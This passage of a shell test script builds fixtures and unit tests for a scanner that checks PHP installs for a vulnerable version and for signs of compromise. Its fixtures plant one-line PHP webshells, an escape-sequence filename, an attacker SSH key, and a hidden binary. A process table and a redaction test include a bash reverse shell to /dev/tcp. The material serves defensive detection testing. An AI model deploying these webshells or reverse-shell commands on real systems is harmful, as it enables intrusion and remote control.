    proc_init "$P"
    proc_add "$P" 600 1 php-fpm7.4 0 /usr/sbin/php-fpm7.4 "$R" "$HOST_MNT" "$HOST_CG" 'php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)'
    proc_add "$P" 601 600 php-fpm7.4 33 /usr/sbin/php-fpm7.4 "$R" "$HOST_MNT" "$HOST_CG" 'php-fpm: pool www'
}

# L: FrankenPHP linked to a shared libphp.so that was replaced (deleted mapping).
build_L() {
    R=$FX/L/root; P=$FX/L/proc
    mkfile "$R/etc/os-release" 'ID=debian'
    mkraw "$R/usr/local/bin/frankenphp" 'Go build ID\000libphp.so\000libc.so.6\000'
    mkbin "$R/usr/local/lib/libphp.so" 8.4.27 fp
    old "$R/usr/local/bin/frankenphp" "$R/usr/local/lib/libphp.so"
    proc_init "$P"
    proc_add "$P" 700 1 frankenphp 33 /usr/local/bin/frankenphp "$R" "$HOST_MNT" "$HOST_CG" 'frankenphp run --config /etc/caddy/Caddyfile' \
        '7f0000000000-7f0000100000 r-xp 00000000 08:01 0 /usr/local/lib/libphp.so (deleted)'
}

# N: install locations outside the classic directories, and symlinked ones.
build_N() {
    R=$FX/N/root
    mkfile "$R/etc/os-release" 'ID=debian'
    mkbin "$R/home/alice/.config/herd-lite/bin/php" 8.4.12
    mkbin "$R/home/bob/.asdf/installs/php/8.3.10/bin/php" 8.3.10
    mkbin "$R/root/.phpenv/versions/8.2.1/bin/php" 8.2.1
    mkbin "$R/Users/carol/.local/share/mise/installs/php/8.3.1/bin/php-fpm" 8.3.1
    mkbin "$R/Users/carol/Library/Application Support/Herd/bin/php84" 8.4.1
    mkbin "$R/nix/store/abc123-php-with-extensions-8.3.12/bin/php-fpm" 8.3.12
    mkbin "$R/usr/pkg/sbin/php-fpm" 8.3.13
    mkbin "$R/www/server/php/83/sbin/php-fpm" 8.3.14
    mkbin "$R/usr/local/cpanel/3rdparty/php/83/sbin/php-fpm" 8.3.15
    mkbin "$R/usr/local/php83/sbin/php-fpm" 8.3.16
    mkbin "$R/usr/local/bin/php-8.3" 8.3.17
    mkbin "$R/var/opt/cpanel/ea-php81/root/usr/sbin/php-fpm" 8.1.34
    ln -s var/opt "$R/opt"
    mkbin "$R/data/php/bin/php-cgi" 8.3.18
    mkdir -p "$R/srv"
    ln -s /data/php "$R/srv/php"
    mkraw "$R/usr/local/bin/php-fpm_exporter" 'exporter\000'
    find "$R" -type f -exec touch -t "$OLD_STAMP" {} +
}

# Q: web roots, logs and temp files for compromise triage (no /proc).
build_Q() {
    R=$FX/Q/root
    mkfile "$R/etc/os-release" 'ID=debian'
    mkfile "$R/etc/passwd" 'root:x:0:0:root:/root:/bin/bash'
    mkbin "$R/usr/sbin/php-fpm8.3" 8.3.36 fp
    mkbin "$R/opt/cpanel/ea-php83/root/usr/sbin/php-fpm" 8.3.36 fp
    old "$R/usr/sbin/php-fpm8.3" "$R/opt/cpanel/ea-php83/root/usr/sbin/php-fpm" "$R/etc/passwd"
    mkfile "$R/etc/php/8.3/fpm/pool.d/www.conf" '[www]' 'user = www-data'
    # Secrets in per-request overrides must not reach the report.
    mkfile "$R/etc/apache2/sites-enabled/site.conf" '<VirtualHost *:80>' \
        '    php_value newrelic.license "a1b2c3SECRETLICENSEKEY0000"' \
        '    php_admin_value session.save_path "tcp://redis:6379?auth=S3cretRedisPass"' '</VirtualHost>'
    mkfile "$R/etc/nginx/conf.d/app.conf" 'server {' \
        '    fastcgi_param PHP_VALUE "session.save_path=tcp://r:6379?auth=NginxSecret99\nmemory_limit=256M";' '}'
    # Web roots: /var/www -> ../data/www (relative), /srv/www -> /data/srvwww (absolute).
    W=$R/data/www/html
    mkfile "$W/index.php" '<?php echo "ok";'
    U=$W/wp-content/uploads
    mkdir -p "$U/2026"
    printf '<?php eval(base64_decode($_POST["x"])); ?>\n' > "$U/2026/a
b.php"
    printf '<?php system($_GET["c"]); ?>\n' > "$U/a${ESC}[2A${ESC}[2K${ESC}[1G  ok.php"
    printf '\377\330\377\340\000\020JFIF\000\001\201\202<?=\203\204\205\206\000\001\002' > "$U/photo.jpg"
    printf '\211PNG\r\n\032\n\000\000\000\015IHDR<?php echo 1; ?>\000' > "$U/tag.png"
    mkdir -p "$R/var" "$R/srv"
    ln -s ../data/www "$R/var/www"
    mkfile "$R/data/srvwww/shell2.php" '<?php passthru($_REQUEST["q"]); ?>'
    ln -s /data/srvwww "$R/srv/www"
    # More than 5000 candidate files, then a webshell sorted last.
    mkdir -p "$R/srv/http/vendor/lib"
    q_i=0
    while [ "$q_i" -lt 5001 ]; do
        printf '<?php return %s;\n' "$q_i" > "$R/srv/http/vendor/lib/f$q_i.php"
        q_i=$((q_i + 1))
    done
    mkfile "$R/srv/http/zz-cmd.php" '<?php system($_GET["c"]); ?>'
    # Logs. Apache: rotated file with crashes before the window.
    L=$R/var/log
    mkfile "$L/apache2/error.log" '[Wed Oct 21 10:00:00.123456 2026] [mpm_prefork:notice] [pid 300] AH00052: child pid 123 exit signal Segmentation fault (11)'
    mkfile "$L/apache2/error.log.1" \
        '[Sun Oct 18 10:00:00.000001 2026] [mpm_prefork:notice] [pid 300] AH00052: child pid 101 exit signal Segmentation fault (11)' \
        '[Mon Oct 19 10:00:00.000001 2026] [mpm_prefork:notice] [pid 300] AH00052: child pid 102 exit signal Segmentation fault (11)' \
        '[Tue Oct 20 06:00:00.000001 2026] [mpm_prefork:notice] [pid 300] AH00052: child pid 103 exit signal Segmentation fault (11)'
    touch -t 202610200625 "$L/apache2/error.log.1"
    # FPM log with nothing from before the window: no baseline.
    mkfile "$L/php8.3-fpm.log" '[21-Oct-2026 10:00:00] WARNING: [pool www] child 9 exited on signal 11 (SIGSEGV - core dumped) after 0.5 seconds from start'
    # FPM log that starts before the window: a real baseline.
    mkfile "$L/php-fpm/www-error.log" '[15-Oct-2026 08:00:00] NOTICE: ready to handle connections' \
        '[21-Oct-2026 10:00:00] WARNING: [pool www] child 10 exited on signal 11 (SIGSEGV - core dumped) after 0.5 seconds from start'
    # nginx: the only earlier crash is in an older rotated file.
    mkfile "$L/nginx/error.log" '2026/10/21 10:00:00 [error] 77#77: php-fpm8.3[77]: segfault at 0 ip 0 sp 0 error 4'
    mkgz "$L/nginx/error.log.2.gz" '2026/10/09 10:00:00 [error] 1#1: php-fpm8.3[55]: segfault at 0 ip 0 sp 0 error 4'
    touch -t 202610100000 "$L/nginx/error.log.2.gz"
    # A log padded with a megabyte of NULs after the crash line.
    { printf '[01-Oct-2026 08:00:00] NOTICE: ready to handle connections\n'
      printf '[21-Oct-2026 10:00:00] WARNING: [pool www] child 11 exited on signal 11 (SIGSEGV - core dumped) after 0.5 seconds from start\n'
      dd if=/dev/zero bs=1024 count=1024 2>/dev/null; } > "$L/php-fpm/big.log"
    # A pre-script warning whose example would be cut inside a UTF-8 character.
    q_pre='[21-Oct-2026 10:00:01 UTC] PHP Warning:  Unknown: '
    q_pad=$(awk -v n=$((219 - ${#q_pre})) 'BEGIN { for (i = 0; i < n; i++) printf "x" }')
    printf '%s%s\342\202\254\342\202\254 in Unknown on line 0\n' "$q_pre" "$q_pad" > "$L/php_errors.log"
    # cPanel EA4 (relative FPM error_log) and Plesk FPM logs.
    mkfile "$R/opt/cpanel/ea-php83/root/etc/php-fpm.conf" '[global]' 'error_log = log/fpm-errors.log'
    mkfile "$R/opt/cpanel/ea-php83/root/usr/var/log/fpm-errors.log" '[21-Oct-2026 10:00:00] WARNING: [pool cp] child 12 exited on signal 11 (SIGSEGV - core dumped) after 0.5 seconds from start'
    # The pool name carries a Latin-1 byte: invalid UTF-8 in a log example.
    mkdir -p "$L/plesk-php83-fpm"
    printf '[21-Oct-2026 10:00:00] WARNING: [pool caf\351] child 13 exited on signal 11 (SIGSEGV - core dumped) after 0.5 seconds from start\n' > "$L/plesk-php83-fpm/error.log"
    # Temp dirs: libraries extracted by Java, and a real executable.
    mkelf "$R/tmp/libnetty_transport_native_epoll_x86_641234567890.so"
    mkelf "$R/tmp/elasticsearch-42/jna--1/jna5678.tmp"
    chmod 644 "$R/tmp/libnetty_transport_native_epoll_x86_641234567890.so" "$R/tmp/elasticsearch-42/jna--1/jna5678.tmp"
    mkelf "$R/tmp/.x/kworker"
}

# R: processes. FPM under a systemd PrivateTmp namespace (root is the host
# root), a reloaded FPM whose file is newer than its start time but is the
# same inode, a vanished pid, a pid whose stat cannot be opened, a Debian CGI
# binary, nginx running a replaced binary, and argv with secrets and ESC.
build_R() {
    R=$FX/R/root; P=$FX/R/proc
    mkfile "$R/etc/os-release" 'ID=debian' 'VERSION_ID="12"'
    mkfile "$R/etc/passwd" 'root:x:0:0:root:/root:/bin/bash' 'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin' \
        'forge:x:1000:1000::/home/forge:/bin/bash'
    mkbin "$R/usr/sbin/php-fpm8.3" 8.3.36 fp
    mkbin "$R/usr/lib/cgi-bin/php8.2" 8.2.20
    mkelf "$R/usr/sbin/apache2"
    mkelf "$R/usr/sbin/nginx"
    mkfile "$R/home/forge/.ssh/authorized_keys" 'ssh-ed25519 AAAAfixtureforge forge@laptop'
    mkfile "$R/var/www/.ssh/authorized_keys" 'ssh-ed25519 AAAAfixturewww attacker'
    mkfile "$R/var/www/html/index.php" '<?php echo 1;'
    old "$R/usr/lib/cgi-bin/php8.2" "$R/usr/sbin/apache2" "$R/usr/sbin/nginx" "$R/etc/passwd" \
        "$R/home/forge/.ssh/authorized_keys" "$R/var/www/.ssh/authorized_keys" "$R/var/www/html/index.php"
    # /usr/sbin/php-fpm8.3 keeps mtime "now", newer than the processes.
    proc_init "$P"
    proc_add "$P" 1 0 systemd 0 /usr/lib/systemd/systemd "$R" "$HOST_MNT" '0::/init.scope' '/sbin/init'
    R_CG='0::/system.slice/php8.3-fpm.service'
    P_EXE_INO=$(ino_of "$R/usr/sbin/php-fpm8.3")
    proc_add "$P" 800 1 php-fpm8.3 0 /usr/sbin/php-fpm8.3 "$R" "$PRIV_MNT" "$R_CG" 'php-fpm: master process (/etc/php/8.3/fpm/php-fpm.conf)'
    proc_add "$P" 801 800 php-fpm8.3 1000 /usr/sbin/php-fpm8.3 "$R" "$PRIV_MNT" "$R_CG" 'php-fpm: pool forge'
    proc_add "$P" 802 800 php-fpm8.3 33 /usr/sbin/php-fpm8.3 "$R" "$PRIV_MNT" "$R_CG" 'php-fpm: pool www'
    proc_add "$P" 803 800 php-fpm8.3 33 /usr/sbin/php-fpm8.3 "$R" "$PRIV_MNT" "$R_CG" 'php-fpm: pool www'
    rm -f "$P/803/exe"
    proc_add "$P" 805 1 php-fpm8.3 0 /usr/sbin/php-fpm8.3 "$R" "$HOST_MNT" "$HOST_CG" 'php-fpm: master process (/etc/php/8.3/fpm/other.conf)'
    P_EXE_INO=0
    mkdir -p "$P/1000"
    ln -s "$P/1000/gone" "$P/1000/stat"
    ln -s "$P/1000/gone" "$P/1000/status"
    proc_add "$P" 300 1 apache2 0 /usr/sbin/apache2 "$R" "$HOST_MNT" "$HOST_CG" '/usr/sbin/apache2 -k start'
    proc_add "$P" 301 300 apache2 33 /usr/sbin/apache2 "$R" "$HOST_MNT" "$HOST_CG" '/usr/sbin/apache2 -k start'
    proc_add "$P" 310 301 php8.2 33 /usr/lib/cgi-bin/php8.2 "$R" "$HOST_MNT" "$HOST_CG" '/usr/lib/cgi-bin/php8.2'
    proc_add "$P" 311 310 sh 33 /usr/bin/dash "$R" "$HOST_MNT" "$HOST_CG" 'sh -c id'
    proc_add "$P" 320 802 bash 33 /usr/bin/bash "$R" "$HOST_MNT" "$HOST_CG" 'bash -c mysqldump --user=forge --password=Pr0dDbPassw0rd forge_db'
    proc_add "$P" 321 802 bash 33 /usr/bin/bash "$R" "$HOST_MNT" "$HOST_CG" "bash -i x${ESC}[1A${ESC}[2K${ESC}[1A${ESC}[2K"
    proc_add "$P" 400 1 nginx 0 '/usr/sbin/nginx (deleted)' "$R" "$HOST_MNT" "$HOST_CG" 'nginx: master process /usr/sbin/nginx'
    proc_add "$P" 401 400 nginx 33 '/usr/sbin/nginx (deleted)' "$R" "$HOST_MNT" "$HOST_CG" 'nginx: worker process'
    proc_add "$P" 402 1 kx 33 '/var/www/.cache/kx (deleted)' "$R" "$HOST_MNT" "$HOST_CG" 'kx'
}

# P: no /proc (macOS, BSD), so the process inventory comes from ps and lsof
# (shims that print fixture data). FPM runs the file on disk; Apache maps a
# libphp that has since been replaced on disk (a different inode), so it must
# be restarted; a reverse shell runs under an FPM worker.
build_P() {
    R=$FX/P/root; P_SHIMS=$FX/P/shims
    mkfile "$R/etc/os-release" 'ID=fixture'
    mkbin "$R/usr/local/sbin/php-fpm" 8.3.12
    mkbin "$R/usr/local/lib/httpd/modules/libphp.so" 8.4.27 fp
    mkelf "$R/usr/local/bin/httpd"
    old "$R/usr/local/sbin/php-fpm" "$R/usr/local/lib/httpd/modules/libphp.so" "$R/usr/local/bin/httpd"
    bp_fpm=$(ls -di "$R/usr/local/sbin/php-fpm" | awk '{ print $1 }')
    bp_httpd=$(ls -di "$R/usr/local/bin/httpd" | awk '{ print $1 }')
    mkdir -p "$P_SHIMS"
    # pid ppid uid etime comm, as "ps -axo pid=,ppid=,uid=,etime=,comm=" prints them.
    mkfile "$P_SHIMS/ps.table" \
        '  100     1     0 10-00:00:00 /usr/local/sbin/php-fpm' \
        '  101   100    70    01:00:00 /usr/local/sbin/php-fpm' \
        '  200     1     0 10-00:00:00 /usr/local/bin/httpd' \
        '  201   200    70       05:00 /usr/local/bin/httpd' \
        '  300   101    70       00:10 /bin/sh' \
        '    1     0     0 10-00:00:00 /sbin/launchd'
    mkfile "$P_SHIMS/ps.cmd" '300 sh -c bash -i >& /dev/tcp/203.0.113.9/4444 0>&1'
    {
        for bp_p in 100 101; do printf 'p%s\nftxt\ni%s\nn/usr/local/sbin/php-fpm\n' "$bp_p" "$bp_fpm"; done
        for bp_p in 200 201; do
            printf 'p%s\nftxt\ni%s\nn/usr/local/bin/httpd\nftxt\ni999999999\nn/usr/local/lib/httpd/modules/libphp.so\n' "$bp_p" "$bp_httpd"
        done
        printf 'p300\nftxt\ni1\nn/bin/sh\np1\nftxt\ni2\nn/sbin/launchd\n'
    } > "$P_SHIMS/lsof.out"
    cat > "$P_SHIMS/ps" <<'EOF'
#!/bin/sh
# Test shim for ps: the process table, or one process's command line.
d=${0%/*}
case "$*" in
    *command=*) for a; do p=$a; done; awk -v p="$p" '$1 == p { sub(/^[^ ]+ /, ""); print; exit }' "$d/ps.cmd" ;;
    *) cat "$d/ps.table" ;;
esac
EOF
    printf '#!/bin/sh\n# Test shim for lsof: txt file records.\ncat "${0%%/*}/lsof.out"\n' > "$P_SHIMS/lsof"
    chmod 755 "$P_SHIMS/ps" "$P_SHIMS/lsof"
}

# P2: like P, plus two processes lsof cannot see (a root httpd and an FPM
# known only by its argv[0]): they must count as not inspected, never clean.
build_P2() {
    P2_SHIMS=$FX/P2/shims
    mkdir -p "$P2_SHIMS"
    cp "$FX/P/shims/ps" "$FX/P/shims/lsof" "$FX/P/shims/lsof.out" "$FX/P/shims/ps.cmd" "$P2_SHIMS/"
    {
        cat "$FX/P/shims/ps.table"
        printf '%s\n' '  900     1     0 10-00:00:00 /usr/sbin/httpd' '  950     1    70    01:00:00 php-fpm: master pr'
    } > "$P2_SHIMS/ps.table"
}

# T: one path, two running groups: a restarted FPM master runs the patched
# file, a second master still runs the deleted old image. The stale one must
# not be hidden by the fresh one.
build_T() {
    R=$FX/T/root; P=$FX/T/proc
    mkfile "$R/etc/os-release" 'ID=debian'
    mkbin "$R/usr/sbin/php-fpm8.3" 8.3.36 fp
    old "$R/usr/sbin/php-fpm8.3"
    proc_init "$P"
    proc_add "$P" 1 0 systemd 0 /usr/lib/systemd/systemd "$R" "$HOST_MNT" '0::/init.scope' '/sbin/init'
    proc_add "$P" 1000123 1 php-fpm8.3 0 /usr/sbin/php-fpm8.3 "$R" "$HOST_MNT" "$HOST_CG" 'php-fpm: master process (/etc/php/8.3/fpm/php-fpm.conf)'
    proc_add "$P" 99876 1 php-fpm8.3 0 '/usr/sbin/php-fpm8.3 (deleted)' "$R" "$HOST_MNT" "$HOST_CG" 'php-fpm: master process (/etc/php/8.3/fpm/other.conf)'
}

# ------------------------------------------------------------- unit tests --

UNIT_DRIVER=$T/unit-driver.sh
cat > "$UNIT_DRIVER" <<'EOF'
# Sources the scanner with PHP2SHELL_SOURCE_ONLY=1 and prints one
# tab-separated line per function call.
P2S_UNIT_SCANNER=$1
P2S_UNIT_FX=$2
set --
PHP2SHELL_SOURCE_ONLY=1
export PHP2SHELL_SOURCE_ONLY
. "$P2S_UNIT_SCANNER"
printf 'SOURCED\t%s\n' "$?"
U_TAB=$(printf "\t")
pv() {
    VP_MAJ=; VP_MIN=; VP_PAT=; VP_SUF=; VP_KIND=
    if parse_version "$1"; then
        printf 'PV%s%s%s%s%s%s%s%s%s%s%s%s\n' "$U_TAB" "$1" "$U_TAB" "$VP_MAJ" "$U_TAB" "$VP_MIN" "$U_TAB" "$VP_PAT" "$U_TAB" "[$VP_SUF]" "$U_TAB" "$VP_KIND"
    else
        printf 'PV%s%s%sFAIL\n' "$U_TAB" "$1" "$U_TAB"
    fi
}
lt() { if ver_lt "$1" "$2"; then r=true; else r=false; fi; printf 'LT%s%s %s%s%s\n' "$U_TAB" "$1" "$2" "$U_TAB" "$r"; }
dc() {
    dc_id=$1; shift
    decide "$@"
    printf 'DC%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s\n' "$U_TAB" "$dc_id" "$U_TAB" "$VD_VERDICT" "$U_TAB" "$VD_EVIDENCE" "$U_TAB" "[$VD_REASON]" \
        "$U_TAB" "[$VD_BRANCH]" "$U_TAB" "[$VD_BSTATUS]" "$U_TAB" "[$VD_FIXED]" "$U_TAB" "[$(printf '%s' "$VD_REMEDIATION" | tr '\t\n' '  ')]"
}
sp() { sp_s=$(sapi_of_name "$1"); printf 'SP%s%s%s%s%s%s\n' "$U_TAB" "$1" "$U_TAB" "$sp_s" "$U_TAB" "$(exposure_of "$sp_s")"; }

pv 8.3.12; pv 8.6.0RC3; pv 8.7.0-dev; pv 8.1.2-1ubuntu2.20; pv 8.5.0alpha1; pv 8.5.0beta2
pv 8.5.0-RC1; pv 8.10.0; pv 5.6.40; pv 8.2.35-1+deb12u1; pv garbage; pv 8.3

lt 8.6.0RC3 8.6.0; lt 8.3.36 8.3.36; lt 8.10.0 8.9.9; lt 8.9.9 8.10.0; lt 8.3.35 8.3.36
lt 8.3.36 8.3.35; lt 8.6.0-dev 8.6.0; lt 8.6.0 8.6.0RC3; lt 8.1.2-1ubuntu2.20 8.1.2
lt 8.4.27RC1 8.4.27; lt 7.4.33 8.2.35; lt 10.0.0 9.9.9; lt 8.5.0alpha1 8.5.0beta2

dc vuln-8.3.12        8.3.12 no n/a no no
dc fixed-8.3.36       8.3.36 no n/a no no
dc fixed-8.5.12       8.5.12 no n/a no no
dc vuln-8.5.11        8.5.11 no n/a no no
dc fp-8.4.26          8.4.26 yes n/a no no
dc eol-8.1.34         8.1.34 no n/a no no
dc eol-8.0.30         8.0.30 no n/a no no
dc eol-7.4.33         7.4.33 no n/a no no
dc eol-5.6.40         5.6.40 no n/a no no
dc fp-7.4.33          7.4.33 yes n/a no no
dc ubuntu-changelog   8.1.2-1ubuntu2.20 no yes no yes
dc ubuntu-nochangelog 8.1.2-1ubuntu2.20 no unavailable no yes
dc ubuntu-cl-no       8.1.2-1ubuntu2.20 no no no yes
dc vendor-data        8.3.12-1~deb12u1 no no yes yes
dc vendor-suffix-ok   8.2.35-1+deb12u1 no n/a no yes
dc rc-of-fixed        8.4.27RC1 no n/a no no
dc pre-8.6.0RC3       8.6.0RC3 no n/a no no
dc pre-8.6.0RC3-fp    8.6.0RC3 yes n/a no no
dc pre-8.6.0-dev      8.6.0-dev no n/a no no
dc pre-8.7.0-dev      8.7.0-dev no n/a no no
dc pre-8.7.0-dev-fp   8.7.0-dev yes n/a no no
dc newer-8.8.0-dev    8.8.0-dev no n/a no no
dc newer-9.0.0        9.0.0 no n/a no no
dc newer-8.7.0        8.7.0 no n/a no no
dc empty              '' no n/a no no
dc garbage            garbage no n/a no no

sp php; sp php8.3; sp php-fpm8.3; sp php-fpm; sp php-fpm83; sp php-cgi8.1; sp php-cgi; sp lsphp
sp frankenphp; sp phpdbg8.3; sp libphp8.2.so; sp libphp.so; sp mod_php7.so
nm() { if is_php_sapi_name "$1"; then nm_r=yes; else nm_r=no; fi; printf 'NM\t%s\t%s\n' "$1" "$nm_r"; }
for nm_n in php php-fpm php-fpm8.3 php83 php8.3 php-8.3 php83-fpm php-cgi8.1 lsphp83 frankenphp phpdbg8.2 \
    libphp.so libphp8.2.so mod_php7.so php-fpm_exporter php-fpm-healthcheck phpize php-config php.ini php-fpm.conf; do nm "$nm_n"; done
spp() { printf 'SPP\t%s\t%s\n' "$1" "$(sapi_of_path "$1")"; }
spp /usr/lib/cgi-bin/php8.2; spp /usr/bin/php8.2; spp /usr/local/bin/php-8.3
U_ESC=$(printf '\033'); U_DEL=$(printf '\177')
printf 'CL\tctrl\t%s\n' "$(clean "a${U_ESC}[2Kb${U_DEL}c${U_TAB}d" | tr -d -c '\001-\037\177' | wc -c | tr -d ' ')"
rd() { printf 'RD\t%s\t%s\n' "$1" "$(printf '%s\n' "$2" | redact_cmd)"; }
rd mysqldump 'sh -c mysqldump --user=forge --password=Pr0dDbPassw0rd forge_db'
rd separate 'tool --token abc123 -x'
rd url 'curl https://bob:hunter2@example.invalid/x'
rd mysql-p 'mysql -uroot -pS3cretPw db'
rd find-print 'find / -print'
rd plain 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
lf() { printf 'LF\t%s\t%s\n' "$1" "$(log_family "$1")"; }
lf /var/log/apache2/error.log.1; lf /var/log/apache2/error.log.2.gz; lf /var/log/httpd/error_log-20261020; lf /var/log/php8.2-fpm.log
printf 'DM\t2026-10-20\t%s\n' "$(date_minus 2026-10-20 14)"
printf 'DM\t2024-03-01\t%s\n' "$(date_minus 2024-03-01 1)"
printf 'TR\teuro\t%s\n' "$(printf 'ab\342\202\254\n' | trunc 4 | od -An -tx1 | tr -d ' \n')"
printf 'TR\tshort\t%s\n' "$(printf 'ab\342\202\254\n' | trunc 40 | od -An -tx1 | tr -d ' \n')"
# Nested web roots: merged into the parent only on the same device.
file_dev() { case $1 in */var/www/html) printf 2 ;; *) printf 1 ;; esac; }
printf 'WR\tsplit\t%s\n' "$(webroots_for "$P2S_UNIT_FX" | tr '\n' ',')"
file_dev() { printf 1; }
printf 'WR\tsame\t%s\n' "$(webroots_for "$P2S_UNIT_FX" | tr '\n' ',')"
printf 'END\n'
EOF

UF=''
uget() { awk -F "$TAB" -v k="$1" -v id="$2" -v f="$3" '$1 == k && $2 == id { print $f; exit }' "$UF"; }

unit_tests() {
    if ! grep -q 'PHP2SHELL_SOURCE_ONLY' "$SCANNER"; then
        nok "unit: scanner supports PHP2SHELL_SOURCE_ONLY=1 (sourcing would run a full scan, so unit tests were skipped)"
        return 0
    fi
    UF=$OUT/$SLUG/unit.txt
    # shellcheck disable=SC2086 # $SH may be "busybox sh"
    (cd "$FX" && $SH "$UNIT_DRIVER" "$SCANNER" "$FX/U/root") > "$UF" 2> "$UF.err" < /dev/null
    u_first=$(head -n 1 "$UF" | cut -f 1)
    eq "unit: sourcing with PHP2SHELL_SOURCE_ONLY=1 prints nothing and returns" "$u_first" SOURCED
    truth "unit: driver ran to the end (no exit from a sourced function)" grep -q '^END$' "$UF"

    # parse_version: MAJ MIN PAT [SUF] KIND
    pv_check() {
        pc_got="$(uget PV "$1" 3) $(uget PV "$1" 4) $(uget PV "$1" 5) $(uget PV "$1" 6) $(uget PV "$1" 7)"
        eq "unit: parse_version $1" "$pc_got" "$2"
    }
    pv_check 8.3.12 '8 3 12 [] release'
    pv_check 8.6.0RC3 '8 6 0 [RC3] pre'
    pv_check 8.7.0-dev '8 7 0 [-dev] pre'
    pv_check 8.1.2-1ubuntu2.20 '8 1 2 [-1ubuntu2.20] vendor'
    pv_check 8.5.0alpha1 '8 5 0 [alpha1] pre'
    pv_check 8.5.0beta2 '8 5 0 [beta2] pre'
    pv_check 8.5.0-RC1 '8 5 0 [-RC1] pre'
    pv_check 8.10.0 '8 10 0 [] release'
    pv_check 5.6.40 '5 6 40 [] release'
    pv_check 8.2.35-1+deb12u1 '8 2 35 [-1+deb12u1] vendor'
    eq "unit: parse_version rejects 'garbage'" "$(uget PV garbage 3)" FAIL
    eq "unit: parse_version rejects '8.3'" "$(uget PV 8.3 3)" FAIL

    lt_check() { eq "unit: ver_lt $1 $2 is $3" "$(uget LT "$1 $2" 3)" "$3"; }
    lt_check 8.6.0RC3 8.6.0 true
    lt_check 8.3.36 8.3.36 false
    lt_check 8.10.0 8.9.9 false
    lt_check 8.9.9 8.10.0 true
    lt_check 8.3.35 8.3.36 true
    lt_check 8.3.36 8.3.35 false
    lt_check 8.6.0-dev 8.6.0 true
    lt_check 8.6.0 8.6.0RC3 false
    lt_check 8.1.2-1ubuntu2.20 8.1.2 false
    lt_check 8.4.27RC1 8.4.27 true
    lt_check 7.4.33 8.2.35 true
    lt_check 10.0.0 9.9.9 false

    # decide: verdict, evidence, reason
    dv() { eq "unit: decide $1 -> verdict $2" "$(uget DC "$1" 3)" "$2"; }
    de() { eq "unit: decide $1 -> evidence $2" "$(uget DC "$1" 4)" "$2"; }
    dr() { has "unit: decide $1 -> reason has $2" "$(uget DC "$1" 5)" "$2"; }
    dv vuln-8.3.12 VULNERABLE; dr vuln-8.3.12 below-fixed-version
    eq "unit: decide vuln-8.3.12 -> fixed version 8.3.36" "$(uget DC vuln-8.3.12 8)" '[8.3.36]'
    eq "unit: decide vuln-8.3.12 -> branch 8.3 supported" "$(uget DC vuln-8.3.12 6) $(uget DC vuln-8.3.12 7)" '[8.3] [supported]'
    has "unit: decide vuln-8.3.12 -> remediation names 8.3.36" "$(uget DC vuln-8.3.12 9)" 8.3.36
    dv fixed-8.3.36 FIXED; de fixed-8.3.36 version
    dv fixed-8.5.12 FIXED; de fixed-8.5.12 version
    dv vuln-8.5.11 VULNERABLE; dr vuln-8.5.11 below-fixed-version
    dv fp-8.4.26 FIXED; de fp-8.4.26 fingerprint
    for u_v in 8.1.34 8.0.30 7.4.33 5.6.40; do
        dv "eol-$u_v" VULNERABLE; dr "eol-$u_v" eol-no-upstream-fix
        eq "unit: decide eol-$u_v -> branch status eol" "$(uget DC "eol-$u_v" 7)" '[eol]'
    done
    lacks "unit: decide eol-8.1.34 -> remediation is not empty" "$(uget DC eol-8.1.34 9)" '[]'
    dv fp-7.4.33 FIXED; de fp-7.4.33 fingerprint
    dv ubuntu-changelog FIXED; de ubuntu-changelog changelog
    dv ubuntu-nochangelog VULNERABLE; dr ubuntu-nochangelog vendor-may-backport; dr ubuntu-nochangelog eol-no-upstream-fix
    dv ubuntu-cl-no VULNERABLE; dr ubuntu-cl-no vendor-may-backport
    dv vendor-data FIXED; de vendor-data vendor-data
    dv vendor-suffix-ok FIXED; de vendor-suffix-ok version
    dv rc-of-fixed VULNERABLE; dr rc-of-fixed below-fixed-version
    dv pre-8.6.0RC3 VULNERABLE; dr pre-8.6.0RC3 prerelease-unpatched
    eq "unit: decide pre-8.6.0RC3 -> branch status prerelease" "$(uget DC pre-8.6.0RC3 7)" '[prerelease]'
    dv pre-8.6.0RC3-fp FIXED; de pre-8.6.0RC3-fp fingerprint
    dv pre-8.6.0-dev VULNERABLE; dr pre-8.6.0-dev prerelease-unpatched
    # master (8.7.0-dev) does not have the fix: a pre-release like 8.6 (SPEC 3 rule 7)
    dv pre-8.7.0-dev VULNERABLE; dr pre-8.7.0-dev prerelease-unpatched
    eq "unit: decide pre-8.7.0-dev -> branch status prerelease" "$(uget DC pre-8.7.0-dev 7)" '[prerelease]'
    dv pre-8.7.0-dev-fp FIXED; de pre-8.7.0-dev-fp fingerprint
    dv newer-8.8.0-dev UNKNOWN; dr newer-8.8.0-dev branch-newer-than-data
    dv newer-9.0.0 UNKNOWN; dr newer-9.0.0 branch-newer-than-data
    dv newer-8.7.0 UNKNOWN; dr newer-8.7.0 branch-newer-than-data
    dv empty UNKNOWN; de empty none
    dv garbage UNKNOWN; de garbage none

    sp_check() { eq "unit: sapi_of_name $1 -> $2 / exposure $3" "$(uget SP "$1" 3) $(uget SP "$1" 4)" "$2 $3"; }
    sp_check php cli low
    sp_check php8.3 cli low
    sp_check php-fpm8.3 fpm high
    sp_check php-fpm fpm high
    sp_check php-fpm83 fpm high
    sp_check php-cgi8.1 cgi elevated
    sp_check php-cgi cgi elevated
    sp_check lsphp litespeed elevated
    sp_check frankenphp frankenphp high
    sp_check phpdbg8.3 phpdbg low
    sp_check libphp8.2.so mod_php highest
    sp_check libphp.so mod_php highest
    sp_check mod_php7.so mod_php highest
    # is_php_sapi_name: exact SAPI names only (SPEC 3 rule 1 for unreadable versions)
    for u_n in php php-fpm php-fpm8.3 php83 php8.3 php-8.3 php83-fpm php-cgi8.1 lsphp83 frankenphp phpdbg8.2 libphp.so libphp8.2.so mod_php7.so; do
        eq "unit: is_php_sapi_name $u_n" "$(uget NM "$u_n" 3)" yes
    done
    for u_n in php-fpm_exporter php-fpm-healthcheck phpize php-config php.ini php-fpm.conf; do
        eq "unit: is_php_sapi_name rejects $u_n" "$(uget NM "$u_n" 3)" no
    done
    eq "unit: sapi_of_path /usr/lib/cgi-bin/php8.2 -> cgi" "$(uget SPP /usr/lib/cgi-bin/php8.2 3)" cgi
    eq "unit: sapi_of_path /usr/bin/php8.2 -> cli" "$(uget SPP /usr/bin/php8.2 3)" cli
